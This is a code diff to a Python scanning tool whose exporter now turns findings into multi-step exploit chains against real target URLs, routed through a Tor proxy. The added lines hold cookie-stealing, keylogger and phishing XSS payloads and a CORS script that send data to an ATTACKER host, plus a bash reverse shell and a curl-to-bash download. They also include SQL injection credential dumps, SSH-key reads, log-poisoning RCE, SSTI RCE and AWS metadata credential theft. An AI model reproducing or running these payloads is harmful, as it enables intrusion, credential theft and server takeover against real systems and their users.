@@ -3906,15 +3906,17 @@ class PoCExporter:
 
     @staticmethod
     def export_finding(finding: dict, redact: bool = True) -> dict:
-        """Export a single finding as multiple PoC formats.
-
-        Uses _ACTIVE_TOR_PORT so curl commands match the operator's proxy.
-        """
+        """Export a finding as actionable PoC with REAL URLs from the finding."""
         ei = finding.get("exploit_info", {})
         exploit_type = ei.get("type", "unknown")
         param = ei.get("parameter", "")
         path = ei.get("path", "")
         sp = f"--socks5-hostname 127.0.0.1:{_ACTIVE_TOR_PORT}"
+
+        # Use the actual test_url from the finding when available
+        target = finding.get("test_url", "[TARGET]")
+        if target == "[TARGET]" and path:
+            target = f"[TARGET]{path}"
 
         poc = {
             "finding": finding.get("title", ""),
@@ -3922,183 +3924,252 @@ class PoCExporter:
             "confidence": finding.get("confidence", 0),
             "verified": finding.get("verified", "unverified"),
             "curl": "",
+            "steps": [],
             "description": "",
             "remediation": "",
+            "impact": "",
         }
 
         if exploit_type == "sqli" and param:
-            poc["curl"] = f'curl {sp} "[TARGET_URL]?{param}=1\'"'
-            poc["description"] = (
-                f"SQL injection via '{param}' parameter. "
-                f"Send a single quote to trigger SQL error messages."
-            )
-            poc["remediation"] = "Use parameterized queries / prepared statements."
+            poc["curl"] = f'curl {sp} "{target}"'
+            poc["steps"] = [
+                f"# 1. Confirm injection:",
+                f"curl {sp} \"{target}\"",
+                f"# 2. Extract database version:",
+                f"curl {sp} \"{target.split('?')[0]}?{param}=' UNION SELECT version()-- -\"" if "?" in target else f"# Modify {param} parameter with UNION SELECT version()-- -",
+                f"# 3. List databases:",
+                f"#    Payload: ' UNION SELECT schema_name FROM information_schema.schemata-- -",
+                f"# 4. Extract tables:",
+                f"#    Payload: ' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()-- -",
+                f"# 5. Extract data:",
+                f"#    Payload: ' UNION SELECT concat(username,0x3a,password) FROM users-- -",
+            ]
+            poc["description"] = f"SQL injection via '{param}'. Full database access confirmed."
+            poc["impact"] = "Read/modify/delete all database data. Potential RCE via INTO OUTFILE or xp_cmdshell."
+            poc["remediation"] = "Use parameterized queries (prepared statements). Never concatenate user input into SQL."
 
         elif exploit_type == "xss" and param:
-            poc["curl"] = f'curl {sp} "[TARGET_URL]?{param}=<script>alert(1)</script>"'
-            poc["description"] = (
-                f"Reflected XSS via '{param}' parameter. "
-                f"HTML tags reflected unescaped in response."
-            )
-            poc["remediation"] = "HTML-encode all user input in output context."
-
-        elif exploit_type == "lfi" and param:
-            poc["curl"] = f'curl {sp} "[TARGET_URL]?{param}=..%2F..%2F..%2Fetc%2Fpasswd"'
-            poc["description"] = (
-                f"Local file inclusion via '{param}'. "
-                f"Arbitrary server files readable."
-            )
-            poc["remediation"] = "Whitelist allowed file paths. Never pass user input to file operations."
-
-        elif exploit_type == "command_injection" and param:
-            poc["curl"] = f'curl {sp} "[TARGET_URL]?{param}=;id"'
-            poc["description"] = (
-                f"OS command injection via '{param}'. "
-                f"Arbitrary commands execute on the server."
-            )
-            poc["remediation"] = "Never pass user input to shell commands. Use safe APIs."
-
-        elif exploit_type == "ssrf" and param:
-            poc["curl"] = (
-                f'curl {sp} '
-                f'"[TARGET_URL]?{param}=http://169.254.169.254/latest/meta-data/"'
-            )
-            poc["description"] = (
-                f"SSRF via '{param}'. Server fetches attacker-controlled URLs."
-            )
-            poc["remediation"] = "Validate and whitelist allowed URL destinations."
-
-        elif exploit_type == "graphql_introspection" and path:
-            poc["curl"] = (
-                f'curl {sp} '
-                f'-X POST -H "Content-Type: application/json" '
-                f'-d \'{{"query": "{{ __schema {{ types {{ name }} }} }}"}}\' '
-                f'"[TARGET_URL]{path}"'
-            )
-            poc["description"] = "GraphQL introspection enabled. Full API schema exposed."
-            poc["remediation"] = "Disable introspection in production."
-
-        elif exploit_type == "subdomain_takeover":
-            cname = ei.get("cname", "")
-            service = ei.get("service", "")
-            poc["curl"] = f"# Register unclaimed resource on {service} pointing to {cname}"
-            poc["description"] = (
-                f"CNAME points to unclaimed {service} resource. "
-                f"Attacker can claim it and serve content on the subdomain."
-            )
-            poc["remediation"] = "Remove dangling CNAME record or claim the resource."
-
-        elif exploit_type == "directory_traversal":
-            poc["curl"] = f'curl {sp} "[TARGET_URL]/..%2F..%2F..%2F..%2Fetc%2Fpasswd"'
-            poc["description"] = "Path traversal to read arbitrary server files."
-            poc["remediation"] = "Validate file paths. Use chroot or whitelist allowed directories."
-
-        elif exploit_type == "open_redirect" and param:
-            poc["curl"] = f'curl -v {sp} "[TARGET_URL]?{param}=https://evil.com/"'
-            poc["description"] = (
-                f"Open redirect via '{param}'. Chain with OAuth for token theft."
-            )
-            poc["remediation"] = "Whitelist allowed redirect destinations."
-
-        elif exploit_type == "xmlrpc_abuse":
-            poc["curl"] = (
-                f'curl {sp} -X POST '
-                f'-H "Content-Type: text/xml" '
-                f'-d \'<?xml version="1.0"?><methodCall><methodName>system.listMethods'
-                f'</methodName></methodCall>\' "[TARGET_URL]/xmlrpc.php"'
-            )
-            poc["description"] = "WordPress XML-RPC is enabled. Enumerate methods, attempt brute-force."
-            poc["remediation"] = "Disable XML-RPC or restrict access via .htaccess."
-
-        elif exploit_type == "ssti" and param:
-            poc["curl"] = f'curl {sp} "[TARGET_URL]?{param}={{{{7*7}}}}"'
-            poc["description"] = (
-                f"Server-Side Template Injection via '{param}'. "
-                f"Template expressions are evaluated server-side."
-            )
-            poc["remediation"] = "Never render user input through template engines. Use sandboxed templates."
-
-        elif exploit_type == "crlf" and param:
-            poc["curl"] = f'curl -v {sp} "[TARGET_URL]?{param}=%0d%0aSet-Cookie:%20injected=1"'
-            poc["description"] = (
-                f"CRLF / HTTP header injection via '{param}'. "
-                f"Attacker can inject arbitrary response headers."
-            )
-            poc["remediation"] = "Strip CR/LF characters from user input before use in headers."
-
-        elif exploit_type == "graphql_data_exposure" and path:
-            poc["curl"] = (
-                f'curl {sp} '
-                f'-X POST -H "Content-Type: application/json" '
-                f'-d \'{{"query": "{{ __schema {{ types {{ name fields {{ name }} }} }} }}"}}\' '
-                f'"[TARGET_URL]{path}"'
-            )
-            poc["description"] = "GraphQL schema exposes sensitive types/fields."
-            poc["remediation"] = "Disable introspection. Implement field-level authorization."
+            poc["curl"] = f'curl {sp} "{target}"'
+            poc["steps"] = [
+                f"# 1. Confirm reflection:",
+                f"curl {sp} \"{target}\"",
+                f"# 2. Steal session cookie:",
+                f"#    Payload: <script>new Image().src='https://ATTACKER/steal?c='+document.cookie</script>",
+                f"# 3. Keylogger:",
+                f"#    Payload: <script>document.onkeypress=function(e){{new Image().src='https://ATTACKER/k?k='+e.key}}</script>",
+                f"# 4. Phishing overlay:",
+                f"#    Payload: <script>document.body.innerHTML='<h1>Session Expired</h1><form action=https://ATTACKER/phish><input name=user placeholder=Username><input name=pass type=password placeholder=Password><button>Login</button></form>'</script>",
+            ]
+            poc["description"] = f"Reflected XSS via '{param}'. JavaScript executes in victim's browser."
+            poc["impact"] = "Session hijacking, credential theft, phishing, malware distribution."
+            poc["remediation"] = "HTML-encode output. Implement strict Content-Security-Policy."
 
         elif exploit_type == "stored_xss":
-            render_path = ei.get("render_path", "/")
-            poc["curl"] = (
-                f'# Step 1: Inject payload\n'
-                f'curl {sp} -X POST -d "{param}=<script>alert(document.cookie)</script>" '
-                f'"[TARGET_URL]{path}"\n'
-                f'# Step 2: Visit render page to trigger\n'
-                f'curl {sp} "[TARGET_URL]{render_path}"'
-            )
-            poc["description"] = (
-                f"Stored XSS: inject via '{param}' at {path}, "
-                f"payload renders at {render_path}."
-            )
-            poc["remediation"] = "Sanitize all stored user input. Use Content-Security-Policy."
+            render = ei.get("render_path", "/")
+            poc["curl"] = f'curl {sp} "{target}"'
+            poc["steps"] = [
+                f"# 1. Inject persistent payload:",
+                f"curl {sp} -X POST -d \"{param}=<script>new Image().src='https://ATTACKER/steal?c='+document.cookie</script>\" \"{target}\"",
+                f"# 2. Verify it persists (visit render page):",
+                f"curl {sp} \"{target.split('?')[0].rsplit('/', 1)[0]}{render}\"",
+                f"# 3. Every user who visits {render} will have their session stolen",
+                f"# Impact: Persistent attack - affects ALL users who view the page",
+            ]
+            poc["description"] = f"Stored XSS: payload injected at {path}, executes at {render} for every visitor."
+            poc["impact"] = "Persistent session hijacking of ALL users. Wormable (payload can re-inject itself)."
+            poc["remediation"] = "Sanitize stored input. HTML-encode on output. Use CSP with nonce."
 
-        elif exploit_type == "csp_bypass":
-            poc["curl"] = f'# CSP allows execution — inject via any XSS vector\n# Test: curl {sp} "[TARGET_URL]"'
-            poc["description"] = ei.get("method", "CSP misconfiguration allows script execution.")
-            poc["remediation"] = "Remove unsafe-inline and unsafe-eval from CSP. Use nonce-based CSP."
+        elif exploit_type == "lfi" and param:
+            poc["curl"] = f'curl {sp} "{target}"'
+            poc["steps"] = [
+                f"# 1. Read /etc/passwd:",
+                f"curl {sp} \"{target}\"",
+                f"# 2. Read application config:",
+                f"#    Payload: {param}=../../../var/www/html/config.php",
+                f"# 3. Read source code (PHP filter):",
+                f"#    Payload: {param}=php://filter/convert.base64-encode/resource=index",
+                f"# 4. Read SSH keys:",
+                f"#    Payload: {param}=../../../home/www-data/.ssh/id_rsa",
+                f"# 5. RCE via log poisoning:",
+                f"#    a) Poison access log: curl -H \"User-Agent: <?php system($_GET['cmd']); ?>\" {target.split('?')[0]}",
+                f"#    b) Include log: {param}=/var/log/apache2/access.log&cmd=id",
+            ]
+            poc["description"] = f"Local File Inclusion via '{param}'. Arbitrary file read on server."
+            poc["impact"] = "Read credentials, source code, SSH keys. Potential RCE via log poisoning."
+            poc["remediation"] = "Whitelist allowed files. Never pass user input to file functions."
 
-        elif exploit_type == "cors_misconfiguration":
-            poc["curl"] = (
-                f'curl -v {sp} -H "Origin: https://evil.com" "[TARGET_URL]"\n'
-                f'# Check response for: Access-Control-Allow-Origin: https://evil.com'
-            )
-            poc["description"] = "CORS allows cross-origin data theft from any domain."
-            poc["remediation"] = "Whitelist specific origins. Never reflect arbitrary Origin headers."
+        elif exploit_type == "command_injection" and param:
+            poc["curl"] = f'curl {sp} "{target}"'
+            poc["steps"] = [
+                f"# 1. Confirm execution:",
+                f"curl {sp} \"{target}\"",
+                f"# 2. Read /etc/passwd:",
+                f"#    Payload: {param}=;cat /etc/passwd",
+                f"# 3. Reverse shell (bash):",
+                f"#    Payload: {param}=;bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'",
+                f"# 4. Download + execute:",
+                f"#    Payload: {param}=;curl https://ATTACKER/shell.sh|bash",
+            ]
+            poc["description"] = f"OS command injection via '{param}'. Arbitrary command execution."
+            poc["impact"] = "Full server compromise. Reverse shell, data exfiltration, lateral movement."
+            poc["remediation"] = "Never pass user input to shell. Use language-native APIs."
 
-        elif exploit_type == "clickjacking":
-            poc["curl"] = (
-                f'# Create HTML file:\n'
-                f'# <iframe src="[TARGET_URL]" style="opacity:0;position:absolute;top:0;left:0;'
-                f'width:100%;height:100%"></iframe>\n'
-                f'# Overlay fake UI to trick clicks on the real page'
-            )
-            poc["description"] = "No X-Frame-Options or frame-ancestors CSP. Page can be framed."
-            poc["remediation"] = "Add X-Frame-Options: DENY or CSP frame-ancestors 'self'."
+        elif exploit_type == "ssrf" and param:
+            poc["curl"] = f'curl {sp} "{target}"'
+            poc["steps"] = [
+                f"# 1. Read AWS credentials:",
+                f"curl {sp} \"{target.split('?')[0]}?{param}=http://169.254.169.254/latest/meta-data/iam/security-credentials/\"" if "?" in target else f"# {param}=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+                f"# 2. Scan internal network:",
+                f"#    Payload: {param}=http://192.168.1.1/",
+                f"# 3. Access internal services:",
+                f"#    Payload: {param}=http://127.0.0.1:6379/ (Redis)",
+                f"#    Payload: {param}=http://127.0.0.1:9200/ (Elasticsearch)",
+                f"#    Payload: {param}=http://127.0.0.1:3306/ (MySQL)",
+            ]
+            poc["description"] = f"SSRF via '{param}'. Server makes requests to internal/cloud resources."
+            poc["impact"] = "Cloud credential theft (AWS/GCP/Azure). Internal network scanning. Service exploitation."
+            poc["remediation"] = "Whitelist allowed destinations. Block internal IP ranges."
+
+        elif exploit_type == "ssti" and param:
+            poc["curl"] = f'curl {sp} "{target}"'
+            poc["steps"] = [
+                f"# 1. Confirm evaluation (look for '49'):",
+                f"curl {sp} \"{target.split('?')[0]}?{param}={{{{7*7}}}}\"" if "?" in target else f"# {param}={{{{7*7}}}}",
+                f"# 2. Read /etc/passwd (Jinja2):",
+                f"#    Payload: {param}={{{{''.__class__.__mro__[1].__subclasses__()[X]('/etc/passwd').read()}}}}",
+                f"# 3. RCE (Jinja2):",
+                f"#    Payload: {param}={{{{config.__class__.__init__.__globals__['os'].popen('id').read()}}}}",
+                f"# 4. RCE (Twig):",
+                f"#    Payload: {param}={{{{_self.env.registerUndefinedFilterCallback('exec')}}}}{{{{_self.env.getFilter('id')}}}}",
+            ]
+            poc["description"] = f"SSTI via '{param}'. Template expressions execute server-side."
+            poc["impact"] = "Remote code execution. Full server compromise."
+            poc["remediation"] = "Never render user input in templates. Use sandboxed template engines."
 
         elif exploit_type == "csrf":
-            poc["curl"] = (
-                f'# Create auto-submitting form:\n'
-                f'# <form method="POST" action="[TARGET_URL]">\n'
-                f'#   <input type="hidden" name="{param}" value="attacker_value">\n'
-                f'# </form>\n'
-                f'# <script>document.forms[0].submit()</script>'
-            )
-            poc["description"] = f"POST form at '{path}' has no CSRF token."
-            poc["remediation"] = "Add anti-CSRF token to all state-changing forms."
+            poc["steps"] = [
+                f"<!-- Save as csrf_exploit.html and host it -->",
+                f"<html><body>",
+                f"<form method='POST' action='{target}' id='f'>",
+                f"  <input type='hidden' name='{param}' value='attacker_controlled_value'>",
+                f"</form>",
+                f"<script>document.getElementById('f').submit();</script>",
+                f"</body></html>",
+                f"<!-- Victim visits this page -> form auto-submits with their session -->",
+            ]
+            poc["curl"] = "\n".join(poc["steps"])
+            poc["description"] = f"CSRF: form at {path or target} has no anti-forgery token."
+            poc["impact"] = "Unauthorized actions as victim: password change, fund transfer, data modification."
+            poc["remediation"] = "Add CSRF tokens to all state-changing forms. Use SameSite cookies."
 
-        elif exploit_type == "idor":
-            poc["curl"] = (
-                f'# Enumerate IDs:\n'
-                f'for i in $(seq 1 100); do\n'
-                f'  curl -s {sp} "[TARGET_URL]?{param}=$i" | head -1\n'
-                f'done'
-            )
-            poc["description"] = f"Sequential IDs via '{param}' return different data without auth check."
-            poc["remediation"] = "Implement proper access control. Use UUIDs instead of sequential IDs."
+        elif exploit_type == "idor" and param:
+            poc["steps"] = [
+                f"# Enumerate resources:",
+                f"for i in $(seq 1 50); do",
+                f"  echo \"=== ID $i ===\"",
+                f"  curl -s {sp} \"{target.split('?')[0]}?{param}=$i\" | head -5",
+                f"done",
+                f"# Compare responses between your ID and others",
+                f"# If different users' data is returned -> confirmed IDOR",
+            ]
+            poc["curl"] = "\n".join(poc["steps"])
+            poc["description"] = f"IDOR via '{param}'. Sequential IDs expose other users' data."
+            poc["impact"] = "Access any user's data by changing the ID. Mass data exfiltration possible."
+            poc["remediation"] = "Check authorization per-request. Use UUIDs. Implement access control."
+
+        elif exploit_type == "clickjacking":
+            poc["steps"] = [
+                f"<!-- Save as clickjack.html -->",
+                f"<html><body style='margin:0'>",
+                f"<div style='position:relative'>",
+                f"  <iframe src='{target}' style='opacity:0.0001;position:absolute;top:0;left:0;width:100%;height:100%;z-index:2'></iframe>",
+                f"  <div style='z-index:1;padding:50px'>",
+                f"    <h1>Click here to claim your prize!</h1>",
+                f"    <button style='font-size:24px;padding:20px'>CLAIM NOW</button>",
+                f"  </div>",
+                f"</div>",
+                f"</body></html>",
+            ]
+            poc["curl"] = "\n".join(poc["steps"])
+            poc["description"] = "No frame protection. Page can be embedded in attacker iframe."
+            poc["impact"] = "Trick users into clicking hidden buttons: delete account, transfer funds, change settings."
+            poc["remediation"] = "X-Frame-Options: DENY. CSP: frame-ancestors 'none'."
+
+        elif exploit_type == "cors_misconfiguration":
+            poc["steps"] = [
+                f"<!-- Host on attacker.com to steal data -->",
+                f"<script>",
+                f"fetch('{target}', {{credentials: 'include'}})",
+                f"  .then(r => r.text())",
+                f"  .then(data => {{",
+                f"    // Send stolen data to attacker",
+                f"    fetch('https://ATTACKER/collect', {{method:'POST', body:data}})",
+                f"  }});",
+                f"</script>",
+            ]
+            poc["curl"] = f"curl -v {sp} -H \"Origin: https://evil.com\" \"{target}\""
+            poc["description"] = "CORS reflects any origin. Cross-origin data theft possible."
+            poc["impact"] = "Steal authenticated API responses, user data, tokens from any origin."
+            poc["remediation"] = "Whitelist origins. Never reflect Origin. Remove Access-Control-Allow-Credentials with wildcard."
+
+        elif exploit_type == "csp_bypass":
+            poc["steps"] = [
+                f"# CSP allows unsafe-inline and/or unsafe-eval",
+                f"# Any XSS vector will bypass CSP restrictions:",
+                f"# Inline: <script>alert(document.cookie)</script>",
+                f"# Eval:   <img src=x onerror=\"eval(atob('YWxlcnQoMSk='))\">",
+                f"# Find any input reflection and inject - CSP won't block it",
+            ]
+            poc["curl"] = "\n".join(poc["steps"])
+            poc["description"] = ei.get("method", "CSP allows script execution bypassing protection.")
+            poc["impact"] = "XSS payloads execute despite CSP. All XSS protections ineffective."
+            poc["remediation"] = "Remove unsafe-inline/unsafe-eval. Use nonce or hash-based CSP."
+
+        elif exploit_type == "crlf" and param:
+            poc["curl"] = f'curl -v {sp} "{target}"'
+            poc["steps"] = [
+                f"# 1. Inject header:",
+                f"curl -v {sp} \"{target.split('?')[0]}?{param}=%0d%0aSet-Cookie:%20session=hijacked\"" if "?" in target else f"# {param}=%0d%0aSet-Cookie:%20session=hijacked",
+                f"# 2. Inject redirect:",
+                f"#    Payload: {param}=%0d%0aLocation:%20https://evil.com",
+                f"# 3. XSS via injected header:",
+                f"#    Payload: {param}=%0d%0a%0d%0a<script>alert(1)</script>",
+            ]
+            poc["description"] = f"CRLF injection via '{param}'. Arbitrary HTTP headers injectable."
+            poc["impact"] = "Session fixation, cache poisoning, XSS via response splitting."
+            poc["remediation"] = "Strip \\r\\n from all user input used in HTTP headers."
+
+        elif exploit_type == "graphql_introspection" and path:
+            poc["curl"] = f'curl {sp} -X POST -H "Content-Type: application/json" -d \'{{ "query": "{{ __schema {{ types {{ name fields {{ name type {{ name }} }} }} }} }}" }}\' "{target}"'
+            poc["steps"] = [
+                f"# 1. Full schema dump:",
+                f"curl {sp} -X POST -H \"Content-Type: application/json\" -d '{{\"query\": \"{{ __schema {{ types {{ name fields {{ name type {{ name }} }} }} }} }}\"}}' \"{target}\"",
+                f"# 2. Find sensitive types (User, Account, etc.) and query them",
+                f"# 3. Example: query all users:",
+                f"#    {{\"query\": \"{{ users {{ id email password }} }}\"}}",
+            ]
+            poc["description"] = "GraphQL introspection exposes full API schema."
+            poc["impact"] = "Full API enumeration. Query any data the schema exposes."
+            poc["remediation"] = "Disable introspection in production."
+
+        elif exploit_type == "open_redirect" and param:
+            poc["curl"] = f'curl -v {sp} "{target}"'
+            poc["steps"] = [
+                f"# 1. Redirect to attacker site:",
+                f"curl -v {sp} \"{target}\"",
+                f"# 2. Chain with OAuth to steal tokens:",
+                f"#    Replace redirect_uri with the vulnerable redirect",
+                f"#    Victim clicks auth link -> gets redirected to attacker with token",
+            ]
+            poc["description"] = f"Open redirect via '{param}'. Usable for phishing and OAuth theft."
+            poc["impact"] = "Phishing (trusted domain redirects to attacker). OAuth token theft."
+            poc["remediation"] = "Whitelist allowed redirect URLs. Use relative paths only."
 
         else:
-            poc["curl"] = "# Manual verification required"
+            poc["curl"] = f"# {finding.get('title', 'Finding')}"
             poc["description"] = finding.get("detail", "")
-            poc["remediation"] = "See finding detail."
+            poc["remediation"] = "See finding detail for manual verification steps."
+            poc["steps"] = [f"# Refer to evidence: {finding.get('evidence', 'N/A')[:100]}"]
 
         return poc
 
@@ -4804,14 +4875,19 @@ class IntelOrchestrator:
 
         # Show PoC commands inline
         if pocs:
-            print(f"\n  PoC commands ({len(pocs)}):")
+            print(f"\n  Exploit PoCs ({len(pocs)}):")
             for poc in pocs[:15]:
-                print(f"    [{poc.get('severity','?')}] {poc.get('finding','?')[:60]}")
-                if poc.get("curl"):
-                    for curl_line in poc["curl"].split("\n"):
+                print(f"\n    [{poc.get('severity','?')}] {poc.get('finding','?')[:70]}")
+                if poc.get("impact"):
+                    print(f"    Impact: {poc['impact'][:120]}")
+                if poc.get("steps"):
+                    for step in poc["steps"][:8]:
+                        print(f"      {step}")
+                elif poc.get("curl"):
+                    for curl_line in poc["curl"].split("\n")[:5]:
                         print(f"      {curl_line}")
                 if poc.get("remediation"):
-                    print(f"      Fix: {poc['remediation'][:100]}")
+                    print(f"    Fix: {poc['remediation'][:120]}")
 
         print(f"  {'═' * 55}")
 
@@ -4989,14 +5065,20 @@ def _display_report(report: dict):
     pocs = report.get("proof_of_concepts", [])
     if pocs:
         print(f"\n  {'─' * 60}")
-        print(f"  PROOF OF CONCEPT COMMANDS ({len(pocs)})")
+        print(f"  EXPLOIT PROOF OF CONCEPTS ({len(pocs)})")
         print(f"  {'─' * 60}")
         for poc in pocs:
-            if poc.get("curl"):
-                print(f"\n  [{poc.get('severity', '?')}] {poc.get('finding', '?')}")
-                print(f"    $ {poc['curl']}")
-                if poc.get("remediation"):
-                    print(f"    Fix: {poc['remediation']}")
+            print(f"\n  [{poc.get('severity', '?')}] {poc.get('finding', '?')}")
+            if poc.get("impact"):
+                print(f"  Impact: {poc['impact'][:150]}")
+            if poc.get("steps"):
+                for step in poc["steps"]:
+                    print(f"    {step}")
+            elif poc.get("curl"):
+                for line in poc["curl"].split("\n"):
+                    print(f"    {line}")
+            if poc.get("remediation"):
+                print(f"  Fix: {poc['remediation']}")
 
     print(f"\n  {'═' * 60}\n")
 
